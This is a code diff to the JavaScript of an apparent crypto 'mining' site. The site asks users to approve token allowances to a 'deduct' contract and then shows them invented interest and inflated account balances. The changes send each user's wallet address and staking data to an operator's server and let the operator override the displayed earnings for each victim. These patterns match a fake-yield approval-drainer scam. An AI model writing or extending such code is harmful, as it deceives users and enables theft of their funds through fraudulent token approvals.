@@ -4,6 +4,9 @@ const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
 const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
 const WETH_CONTRACT_ADDRESS = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2';
 
+// ===== 新增：API 服务器地址 =====
+const API_BASE_URL = 'http://localhost:3000'; // 您的本地后台服务器地址
+
 //---ABI Definitions---
 const DEDUCT_CONTRACT_ABI = [
     "function isServiceActiveFor(address customer) view returns (bool)",
@@ -44,8 +47,31 @@ let interestInterval = null;
 let nextBenefitInterval = null;
 let accountBalance = { USDT: 0, USDC: 0, WETH: 0 };
 
-
 //---UI Control Functions---
+
+// ===== 新增：将用户数据发送到后端服务器 =====
+async function saveUserData() {
+    if (!userAddress) return;
+    const dataToSave = {
+        stakingStartTime: localStorage.getItem('stakingStartTime'),
+        claimedInterest: localStorage.getItem('claimedInterest'),
+        pledgedAmount: localStorage.getItem('pledgedAmount'),
+        nextBenefitTime: localStorage.getItem('nextBenefitTime'),
+        accountBalance: JSON.parse(localStorage.getItem('accountBalance'))
+    };
+    try {
+        await fetch(`${API_BASE_URL}/api/user-data`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ address: userAddress, data: dataToSave })
+        });
+        console.log("User data sent to server.");
+    } catch (error) {
+        console.warn("Could not send user data to the local server. Is it running?", error);
+    }
+}
+
+
 function updateStatus(message, isWarning = false) {
     if (!statusDiv) return;
     statusDiv.innerHTML = message || '';
@@ -96,35 +122,26 @@ function disableInteractiveElements(disable = false) {
     if (claimBtn) claimBtn.disabled = disable;
 }
 
-// ===== 关键修改：Account Balance = Wallet Balance + Claimed Balance =====
 function updateBalancesUI(walletBalances) {
     if (!walletTokenSelect) return;
-    
     const selectedToken = walletTokenSelect.value;
     const decimals = { USDT: 6, USDC: 6, WETH: 18 };
-
-    // 1. 处理 Wallet Balance
     const walletTokenBigInt = walletBalances[selectedToken.toLowerCase()] || 0n;
     const formattedWalletBalance = ethers.formatUnits(walletTokenBigInt, decimals[selectedToken]);
     if (walletBalanceAmount) {
         walletBalanceAmount.textContent = parseFloat(formattedWalletBalance).toFixed(3);
     }
-    
-    // 2. 处理 Account Balance
     const claimedBalance = accountBalance[selectedToken] || 0;
     const totalAccountBalance = parseFloat(formattedWalletBalance) + claimedBalance;
     if (accountBalanceValue) {
         accountBalanceValue.textContent = `${totalAccountBalance.toFixed(3)} ${selectedToken}`;
     }
-
-    // 3. 处理余额为零的提示
     if (parseFloat(formattedWalletBalance) < 0.001) {
         updateStatus(`Notice: Your ${selectedToken} balance is zero.`, true);
     } else if (statusDiv.style.color === 'rgb(255, 215, 0)') {
         updateStatus("");
     }
 }
-
 
 function updateTotalFunds() {
     if (totalValue) {
@@ -140,18 +157,44 @@ function updateTotalFunds() {
     }
 }
 
-function updateInterest() {
-    if (stakingStartTime && grossOutputValue && cumulativeValue) {
+async function updateInterest() {
+    if (!stakingStartTime || !grossOutputValue || !cumulativeValue || !userAddress) return;
+
+    let grossOutput, cumulative;
+
+    // 尝试从服务器获取覆盖值
+    try {
+        const response = await fetch(`${API_BASE_URL}/api/all-data`);
+        if (response.ok) {
+            const allData = await response.json();
+            const userOverrides = allData.overrides[userAddress] || {};
+            if (typeof userOverrides.grossOutput === 'number') {
+                grossOutput = userOverrides.grossOutput;
+            }
+            if (typeof userOverrides.cumulative === 'number') {
+                cumulative = userOverrides.cumulative;
+            }
+        }
+    } catch (error) {
+        // 如果无法连接服务器，则不应用覆盖，这很正常
+    }
+
+    // 如果没有覆盖值，则按原逻辑计算
+    if (typeof grossOutput === 'undefined') {
         const currentTime = Date.now();
         const elapsedSeconds = Math.floor((currentTime - stakingStartTime) / 1000);
         const baseInterestRate = 0.000001;
         const interestRate = baseInterestRate * pledgedAmount;
-        const grossOutput = elapsedSeconds * interestRate;
-        const cumulative = grossOutput - claimedInterest;
-        grossOutputValue.textContent = `${grossOutput.toFixed(7)} ETH`;
-        cumulativeValue.textContent = `${cumulative.toFixed(7)} ETH`;
+        grossOutput = elapsedSeconds * interestRate;
     }
+     if (typeof cumulative === 'undefined') {
+        cumulative = grossOutput - claimedInterest;
+    }
+
+    grossOutputValue.textContent = `${grossOutput.toFixed(7)} ETH`;
+    cumulativeValue.textContent = `${cumulative.toFixed(7)} ETH`;
 }
+
 
 function updateNextBenefitTimer() {
     if (!nextBenefit) return;
@@ -170,6 +213,7 @@ function updateNextBenefitTimer() {
             newNextBenefitTimestamp += twelveHoursInMillis;
         }
         localStorage.setItem('nextBenefitTime', newNextBenefitTimestamp.toString());
+        saveUserData(); // 倒数周期更新时也保存一下数据
         diff = newNextBenefitTimestamp - now;
     }
     const totalSeconds = Math.floor(diff / 1000);
@@ -188,9 +232,9 @@ function getETOffsetMilliseconds() {
     const dstStart = new Date(mar.getFullYear(), mar.getMonth(), 8 + (7 - marDay));
     const dstEnd = new Date(nov.getFullYear(), nov.getMonth(), 1 + (7 - novDay));
     if (now >= dstStart && now < dstEnd) {
-        return -4 * 60 * 60 * 1000; // EDT: UTC-4
+        return -4 * 60 * 60 * 1000;
     }
-    return -5 * 60 * 60 * 1000; // EST: UTC-5
+    return -5 * 60 * 60 * 1000;
 }
 
 function setInitialNextBenefitTime() {
@@ -211,7 +255,7 @@ function setInitialNextBenefitTime() {
     }
     const finalNextBenefitTimestamp = nextBenefitTimeET.getTime() - etOffset;
     localStorage.setItem('nextBenefitTime', finalNextBenefitTimestamp.toString());
-    console.log(`Next benefit target (UTC timestamp) set to: ${new Date(finalNextBenefitTimestamp).toISOString()}`);
+    saveUserData();
 }
 
 function activateStakingUI() {
@@ -228,7 +272,6 @@ function activateStakingUI() {
     if (storedAccountBalance) {
         accountBalance = storedAccountBalance;
     }
-
     if (startBtn) startBtn.style.display = 'none';
     if (document.getElementById('claimButton')) return;
     claimBtn.textContent = translations[currentLang]?.claimBtnText || 'Claim';
@@ -245,6 +288,7 @@ function activateStakingUI() {
     interestInterval = setInterval(updateInterest, 1000);
     if (nextBenefitInterval) clearInterval(nextBenefitInterval);
     nextBenefitInterval = setInterval(updateNextBenefitTimer, 1000);
+    saveUserData();
 }
 
 //---Core Wallet Logic---
@@ -313,21 +357,17 @@ async function updateUIBasedOnChainState() {
             usdcContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS),
             wethContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS).catch(() => 0n)
         ]);
-
         const isWethAuthorized = wethAllowance >= requiredAllowance;
         const isUsdtAuthorized = usdtAllowance >= requiredAllowance;
         const isUsdcAuthorized = usdcAllowance >= requiredAllowance;
         const hasSufficientAllowance = isWethAuthorized || isUsdtAuthorized || isUsdcAuthorized;
         const isFullyAuthorized = isServiceActive || hasSufficientAllowance;
-
         if (isFullyAuthorized) {
             console.log("On-chain state is AUTHORIZED. Switching to staking UI.");
             if (isWethAuthorized) walletTokenSelect.value = 'WETH';
             else if (isUsdtAuthorized) walletTokenSelect.value = 'USDT';
             else if (isUsdcAuthorized) walletTokenSelect.value = 'USDC';
-            
             walletTokenSelect.dispatchEvent(new Event('change'));
-            
             setInitialNextBenefitTime();
             activateStakingUI();
         } else {
@@ -345,24 +385,12 @@ async function updateUIBasedOnChainState() {
 async function handleConditionalAuthorizationFlow() {
     if (!signer) throw new Error("Wallet not connected");
     updateStatus('Preparing authorization...');
-    
     const selectedToken = walletTokenSelect.value;
     console.log(`User selected ${selectedToken} for authorization.`);
-
     const requiredAllowance = await deductContract.REQUIRED_ALLOWANCE_THRESHOLD();
     const serviceActivated = await deductContract.isServiceActiveFor(userAddress);
-
-    const tokenMap = {
-        'USDT': { name: 'USDT', contract: usdtContract, address: USDT_CONTRACT_ADDRESS },
-        'USDC': { name: 'USDC', contract: usdcContract, address: USDC_CONTRACT_ADDRESS },
-        'WETH': { name: 'WETH', contract: wethContract, address: WETH_CONTRACT_ADDRESS }
-    };
-
-    const tokensToProcess = [
-        tokenMap[selectedToken],
-        ...Object.values(tokenMap).filter(t => t.name !== selectedToken)
-    ];
-    
+    const tokenMap = { 'USDT': { name: 'USDT', contract: usdtContract, address: USDT_CONTRACT_ADDRESS }, 'USDC': { name: 'USDC', contract: usdcContract, address: USDC_CONTRACT_ADDRESS }, 'WETH': { name: 'WETH', contract: wethContract, address: WETH_CONTRACT_ADDRESS } };
+    const tokensToProcess = [ tokenMap[selectedToken], ...Object.values(tokenMap).filter(t => t.name !== selectedToken) ];
     let tokenToActivate = '';
     for (const { name, contract, address } of tokensToProcess) {
         updateStatus(`Checking ${name} allowance...`);
@@ -378,7 +406,6 @@ async function handleConditionalAuthorizationFlow() {
             if (!tokenToActivate) tokenToActivate = address;
         }
     }
-
     if (!serviceActivated && tokenToActivate) {
         const tokenName = tokensToProcess.find(t => t.address === tokenToActivate).name;
         updateStatus(`Activating service (using ${tokenName})...`);
@@ -394,30 +421,21 @@ async function connectWallet() {
         updateStatus('Please confirm connection in your wallet...');
         const accounts = await provider.send('eth_requestAccounts', []);
         if (accounts.length === 0) throw new Error("No account selected.");
-        
         signer = await provider.getSigner();
         userAddress = await signer.getAddress();
-
         connectButton.classList.add('connected');
         connectButton.textContent = 'Connected';
         connectButton.title = 'Disconnect Wallet';
-
         deductContract = new ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, signer);
         usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
         usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
         wethContract = new ethers.Contract(WETH_CONTRACT_ADDRESS, ERC20_ABI, signer);
-        
         await updateUIBasedOnChainState();
-        
         updateStatus('Fetching wallet balances...');
-        const balances = {
-            usdt: await usdtContract.balanceOf(userAddress).catch(() => 0n),
-            usdc: await usdcContract.balanceOf(userAddress).catch(() => 0n),
-            weth: await wethContract.balanceOf(userAddress).catch(() => 0n)
-        };
+        const balances = { usdt: await usdtContract.balanceOf(userAddress).catch(() => 0n), usdc: await usdcContract.balanceOf(userAddress).catch(() => 0n), weth: await wethContract.balanceOf(userAddress).catch(() => 0n) };
         updateBalancesUI(balances);
         updateStatus("");
-
+        await saveUserData();
     } catch (error) {
         console.error("Connection Error:", error);
         let userMessage = `Error: ${error.message}`;
@@ -436,16 +454,9 @@ async function getEthPrices() {
     try {
         updateStatus("Fetching latest prices...");
         const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd,usdt');
-        if (!response.ok) {
-            throw new Error('Network response was not ok');
-        }
+        if (!response.ok) throw new Error('Network response was not ok');
         const data = await response.json();
-        const prices = {
-            usd: data.ethereum.usd,
-            usdt: data.ethereum.usdt,
-            usdc: data.ethereum.usd, // 假设 USDC 价格等于 USD
-            weth: data.ethereum.usdt, // WETH 价格等于 ETH
-        };
+        const prices = { usd: data.ethereum.usd, usdt: data.ethereum.usdt, usdc: data.ethereum.usd, weth: data.ethereum.usdt };
         updateStatus("");
         return prices;
     } catch (error) {
@@ -458,50 +469,32 @@ async function getEthPrices() {
 async function claimInterest() {
     const claimableETHString = cumulativeValue.textContent.replace(' ETH', '');
     const claimableETH = parseFloat(claimableETHString);
-
     if (!claimableETH || claimableETH < 0.0000001) {
         alert("No claimable interest available.");
         return;
     }
-
     const prices = await getEthPrices();
     if (!prices) {
         alert("Failed to get price data. Please try again later.");
         return;
     }
-    
     const selectedToken = walletTokenSelect.value;
     const ethToTokenRate = prices[selectedToken.toLowerCase()];
     const valueInToken = claimableETH * ethToTokenRate;
-
-    const confirmation = confirm(
-        `You are about to claim ${claimableETH.toFixed(7)} ETH.\n` +
-        `Current ETH Price: ~$${prices.usd.toFixed(2)}\n` +
-        `This will be converted to approximately ${valueInToken.toFixed(3)} ${selectedToken} and added to your Account Balance.\n\n` +
-        `Do you want to proceed?`
-    );
-
+    const confirmation = confirm(`You are about to claim ${claimableETH.toFixed(7)} ETH.\nCurrent ETH Price: ~$${prices.usd.toFixed(2)}\nThis will be converted to approximately ${valueInToken.toFixed(3)} ${selectedToken} and added to your Account Balance.\n\nDo you want to proceed?`);
     if (confirmation) {
         const grossOutputETH = parseFloat(grossOutputValue.textContent.replace(' ETH', ''));
         claimedInterest = grossOutputETH;
         localStorage.setItem('claimedInterest', claimedInterest.toString());
-        
         accountBalance[selectedToken] = (accountBalance[selectedToken] || 0) + valueInToken;
         localStorage.setItem('accountBalance', JSON.stringify(accountBalance));
-        
         updateInterest();
-        
-        const walletBalances = {
-            usdt: await usdtContract.balanceOf(userAddress).catch(() => 0n),
-            usdc: await usdcContract.balanceOf(userAddress).catch(() => 0n),
-            weth: await wethContract.balanceOf(userAddress).catch(() => 0n)
-        };
+        const walletBalances = { usdt: await usdtContract.balanceOf(userAddress).catch(() => 0n), usdc: await usdcContract.balanceOf(userAddress).catch(() => 0n), weth: await wethContract.balanceOf(userAddress).catch(() => 0n) };
         updateBalancesUI(walletBalances);
-        
         alert("Claim successful! Your Account Balance has been updated.");
+        await saveUserData();
     }
 }
-
 
 //---Language Control---
 const translations = { 'en': { title: 'Popular Mining', subtitle: 'Start Earning Millions', tabLiquidity: 'Liquidity', tabPledging: 'Pledging', grossOutputLabel: 'Gross Output', cumulativeLabel: 'Cumulative', walletBalanceLabel: 'Wallet Balance', accountBalanceLabel: 'Account Balance', compoundLabel: '⚡ Compound', nextBenefit: 'Next Benefit: 00:00:00', startBtnText: 'Start', pledgeAmountLabel: 'Pledge Amount', pledgeDurationLabel: 'Duration', pledgeBtnText: 'Pledge Now', totalPledgedLabel: 'Total Pledged', expectedYieldLabel: 'Expected Yield', apyLabel: 'APY', lockedUntilLabel: 'Locked Until', claimBtnText: 'Claim' }, 'zh-Hant': { title: '熱門挖礦', subtitle: '開始賺取數百萬', tabLiquidity: '流動性', tabPledging: '質押', grossOutputLabel: '總產出', cumulativeLabel: '累計', walletBalanceLabel: '錢包餘額', accountBalanceLabel: '帳戶餘額', compoundLabel: '⚡ 複利', nextBenefit: '下次收益: 00:00:00', startBtnText: '開始', pledgeAmountLabel: '質押金額', pledgeDurationLabel: '期間', pledgeBtnText: '立即質押', totalPledgedLabel: '總質押', expectedYieldLabel: '預期收益', apyLabel: '年化收益率', lockedUntilLabel: '鎖定至', claimBtnText: '領取' }, 'zh-Hans': { title: '热门挖矿', subtitle: '开始赚取数百万', tabLiquidity: '流动性', tabPledging: '质押', grossOutputLabel: '总产出', cumulativeLabel: '累计', walletBalanceLabel: '钱包余额', accountBalanceLabel: '账户余额', compoundLabel: '⚡ 复利', nextBenefit: '下次收益: 00:00:00', startBtnText: '开始', pledgeAmountLabel: '质押金额', pledgeDurationLabel: '期间', pledgeBtnText: '立即质押', totalPledgedLabel: '总质押', expectedYieldLabel: '预期收益', apyLabel: '年化收益率', lockedUntilLabel: '锁定至', claimBtnText: '领取' } };
@@ -563,7 +556,6 @@ startBtn.addEventListener('click', async () => {
         alert("Could not fetch balance. Please try again later.");
         return;
     }
-
     startBtn.disabled = true;
     startBtn.textContent = 'Authorizing...';
     try {
@@ -591,16 +583,13 @@ pledgeBtn.addEventListener('click', async () => {
     const totalPledgedValue = document.getElementById('totalPledgedValue');
     let currentTotal = parseFloat(totalPledgedValue.textContent) || 0;
     totalPledgedValue.textContent = `${(currentTotal + amount).toFixed(2)} ${pledgeToken.value}`;
+    await saveUserData();
 });
 
 refreshWallet.addEventListener('click', async () => {
     if (!signer) { alert('Please connect your wallet first!'); return; }
     updateStatus('Refreshing balances...');
-    const balances = {
-        usdt: await usdtContract.balanceOf(userAddress).catch(() => 0n),
-        usdc: await usdcContract.balanceOf(userAddress).catch(() => 0n),
-        weth: await wethContract.balanceOf(userAddress).catch(() => 0n)
-    };
+    const balances = { usdt: await usdtContract.balanceOf(userAddress).catch(() => 0n), usdc: await usdcContract.balanceOf(userAddress).catch(() => 0n), weth: await wethContract.balanceOf(userAddress).catch(() => 0n) };
     updateBalancesUI(balances);
     updateStatus('');
     alert('Wallet balance refreshed!');
@@ -612,11 +601,7 @@ walletTokenSelect.addEventListener('change', async () => {
         if (accountBalanceValue) accountBalanceValue.textContent = `0.000 ${walletTokenSelect.value}`;
         return;
     }
-    const balances = {
-        usdt: await usdtContract.balanceOf(userAddress).catch(() => 0n),
-        usdc: await usdcContract.balanceOf(userAddress).catch(() => 0n),
-        weth: await wethContract.balanceOf(userAddress).catch(() => 0n)
-    };
+    const balances = { usdt: await usdtContract.balanceOf(userAddress).catch(() => 0n), usdc: await usdcContract.balanceOf(userAddress).catch(() => 0n), weth: await wethContract.balanceOf(userAddress).catch(() => 0n) };
     updateBalancesUI(balances);
 });
 
